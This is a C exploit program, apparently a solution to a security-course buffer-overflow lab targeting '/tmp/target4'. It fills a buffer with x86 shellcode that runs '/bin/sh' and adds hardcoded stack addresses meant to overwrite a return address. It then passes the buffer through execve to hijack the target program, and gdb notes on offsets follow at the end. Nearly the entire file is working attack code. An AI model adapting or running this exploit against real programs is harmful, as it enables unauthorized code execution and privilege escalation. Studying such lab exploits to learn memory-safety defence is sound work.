#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[250];
  char sh[] = "\xff\xff\xff\xff\xff\xff\xff\xff\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
  int i = 0;
  for (i; i < 96; i++){
  	if(i < sizeof(sh) - 1)
		buf[i] = sh[i];
	else
  		buf[i] = 'b';
  }
  char sloc[4] = "\xf4\xfe\xff\xbf";
  strcpy(&buf[i], sloc); // location of shell code.
  i += 4;
  // char b[4] = "\x5c\xff\xff\xbf";
  // strcpy(&buf[i], b); // location of block in our buffer
  // i += 4;
  // char q[4] = "\xff\xff\xff\xff";
  // strcpy(&buf[i], q); // doesn't matter
  // i += 4;
  char rtn[4] = "\x7c\xfd\xff\xbf";
  strcpy(&buf[i], rtn); // return address location
  i += 4;
  for (i; i < 250; i++){
  	buf[i] = '\x90';
  }
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

// $1 = 0x8059c28 ""
// (gdb) print q
// $2 = 0x8059be0 ""
// (gdb) 
// $3 = 0x8059b78 ""
// (gdb) 
// 16*14-(16*7 + 8)

// bffffef4
//Location of return address bffffd7c
// bfffff54